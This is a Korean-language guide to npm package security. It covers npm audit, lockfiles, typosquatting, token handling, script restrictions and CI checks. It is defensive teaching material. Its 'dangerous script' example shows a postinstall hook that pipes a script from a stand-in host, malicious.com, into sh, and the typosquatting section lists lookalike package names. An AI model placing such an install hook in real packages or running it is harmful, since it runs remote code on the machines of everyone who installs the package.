# npm 보안 (Security)

## 개요

npm 패키지 보안은 애플리케이션의 안전을 위해 매우 중요합니다. 취약점, 악성 패키지, 공급망 공격으로부터 보호해야 합니다.

## npm audit - 취약점 검사

### 기본 사용법

```bash
# 취약점 검사
npm audit

# 자동 수정 (가능한 경우)
npm audit fix

# 강제 수정 (breaking changes 포함)
npm audit fix --force

# JSON 형식으로 출력
npm audit --json

# 요약만 보기
npm audit --audit-level=moderate
```

### audit 출력 예시

```
found 3 vulnerabilities (1 moderate, 2 high) in 1200 packages
  run `npm audit fix` to fix 2 of them.
  1 vulnerability requires manual review.
```

### 심각도 레벨

| 레벨 | 설명 |
|------|------|
| **Critical** | 즉시 수정 필요 |
| **High** | 가능한 빨리 수정 |
| **Moderate** | 적절한 시기에 수정 |
| **Low** | 여유있을 때 수정 |

## 취약점 발견 시 대응

### 1. 자동 수정 시도

```bash
npm audit fix
```

### 2. 패키지 업데이트

```bash
# 특정 패키지 업데이트
npm update <package-name>

# 모든 패키지 최신 마이너 버전으로
npm update

# 메이저 버전 업데이트
npm install <package-name>@latest
```

### 3. 대체 패키지 찾기

취약점이 수정되지 않으면:
- 유사 기능의 다른 패키지 검색
- 직접 fork하여 수정
- 해당 기능 제거 고려

### 4. 예외 처리 (마지막 수단)

```bash
# .npmrc에 추가 (권장하지 않음)
audit=false
```

## package-lock.json의 중요성

### 역할

```json
{
  "name": "my-app",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "node_modules/express": {
      "version": "4.18.2",
      "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
      "integrity": "sha512-5/PsL6iGPdfQ/lKM1UuielYgv3BUoJfz1aUwU9vHZ+J7gyvwdQXFEBIEIaxeGf0GIcreATNyBExtalisDbuMqQ=="
    }
  }
}
```

### 이점

- ✅ 정확한 버전 고정
- ✅ 팀원 간 동일한 의존성
- ✅ 무결성 검증 (integrity)
- ✅ 악성 패키지 방지

### Best Practice

```bash
# 항상 Git에 커밋
git add package-lock.json

# CI/CD에서는 ci 사용
npm ci  # npm install 대신
```

## 악성 패키지 방지

### 1. 패키지 검증

```bash
# 패키지 정보 확인
npm view <package-name>

# 유지보수 상태
npm view <package-name> maintainers
npm view <package-name> repository
npm view <package-name> time
```

### 2. 다운로드 수 확인

```bash
npm view <package-name> dist.downloads
```

- 다운로드 수가 많을수록 신뢰도 높음
- 하지만 100% 보장은 아님

### 3. GitHub 저장소 확인

- Stars, Forks, Issues 확인
- 마지막 커밋 날짜
- 활발한 유지보수 여부
- 라이선스 확인

### 4. 의존성 최소화

```json
{
  "dependencies": {
    // 필요한 패키지만 설치
  }
}
```

## Typosquatting 공격 주의

### 예시

```bash
# 정상 패키지
npm install lodash

# 악성 패키지 (오타)
npm install l0dash    # 0(숫자)
npm install lodahh    # 철자 유사
npm install lodash-utils  # 비슷한 이름
```

### 방지법

- 패키지 이름 정확히 확인
- package.json 복사/붙여넣기
- 자동완성 활용

## 환경 변수 보안

### ❌ 나쁜 예

```javascript
// 코드에 직접 하드코딩
const API_KEY = 'abc123secret';
```

### ✅ 좋은 예

```javascript
// .env 파일 사용
const API_KEY = process.env.API_KEY;
```

```bash
# .gitignore에 추가
.env
.env.local
.env.*.local
```

## npm 토큰 보안

### 토큰 생성

```bash
npm login
npm token create --read-only
```

### 토큰 사용

```bash
# .npmrc (로컬에만, Git에 커밋 금지)
//registry.npmjs.org/:_authToken=YOUR_TOKEN
```

### CI/CD 환경변수

```yaml
# GitHub Actions 예시
env:
  NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

## 의존성 트리 검토

### 의존성 확인

```bash
# 직접 의존성만
npm list --depth=0

# 전체 트리
npm list

# 특정 패키지 경로
npm list <package-name>
```

### 불필요한 의존성 제거

```bash
# 사용하지 않는 패키지 찾기
npm prune

# 개발 의존성 제외하고 설치
npm install --production
```

## 스크립트 보안

### ❌ 위험한 스크립트

```json
{
  "scripts": {
    "postinstall": "curl http://malicious.com/script.sh | sh"
  }
}
```

### ✅ 안전한 스크립트

```json
{
  "scripts": {
    "build": "webpack --config webpack.config.js",
    "test": "jest"
  }
}
```

### 스크립트 실행 제한

```bash
# .npmrc
ignore-scripts=true

# 특정 설치 시에만 스크립트 실행
npm install --ignore-scripts
```

## 보안 체크리스트

### 설치 전

- [ ] 패키지 이름 정확히 확인
- [ ] GitHub 저장소 확인
- [ ] 다운로드 수 확인
- [ ] 마지막 업데이트 날짜 확인
- [ ] 라이선스 확인

### 설치 후

- [ ] npm audit 실행
- [ ] package-lock.json 커밋
- [ ] .env 파일을 .gitignore에 추가
- [ ] 의존성 트리 검토
- [ ] 불필요한 패키지 제거

### 정기적으로

- [ ] npm audit 실행 (주간/월간)
- [ ] 패키지 업데이트 (npm update)
- [ ] 사용하지 않는 패키지 제거
- [ ] 보안 뉴스레터 구독

## 유용한 도구

### 1. Snyk

```bash
npm install -g snyk
snyk test
snyk monitor
```

- 취약점 자동 스캔
- GitHub 통합
- 수정 PR 자동 생성

### 2. npm-check

```bash
npm install -g npm-check
npm-check -u
```

- 업데이트 가능한 패키지 확인
- 사용하지 않는 패키지 표시

### 3. depcheck

```bash
npm install -g depcheck
depcheck
```

- 사용하지 않는 의존성 찾기

## CI/CD 보안 설정

### GitHub Actions

```yaml
name: Security Audit

on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm audit
      - run: npm audit --audit-level=high
```

### 실패 시 빌드 중단

```yaml
- run: npm audit --audit-level=moderate
```

## 보안 뉴스레터 및 자료

### 구독 추천

- [npm Security Advisories](https://www.npmjs.com/advisories)
- [Snyk Vulnerability DB](https://snyk.io/vuln/)
- [GitHub Security Advisories](https://github.com/advisories)

### 정기 체크

```bash
# 매주 실행
npm outdated
npm audit

# 월간 업데이트
npm update
```

## Best Practices 요약

1. **항상 npm audit 실행**
2. **package-lock.json 커밋**
3. **정기적으로 패키지 업데이트**
4. **최소한의 의존성 유지**
5. **환경 변수로 민감 정보 관리**
6. **신뢰할 수 있는 패키지만 사용**
7. **CI/CD에 보안 검사 통합**
8. **스크립트 실행 주의**

## 참고 자료

- [npm Security Best Practices](https://docs.npmjs.com/security)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Snyk Open Source Security](https://snyk.io/)
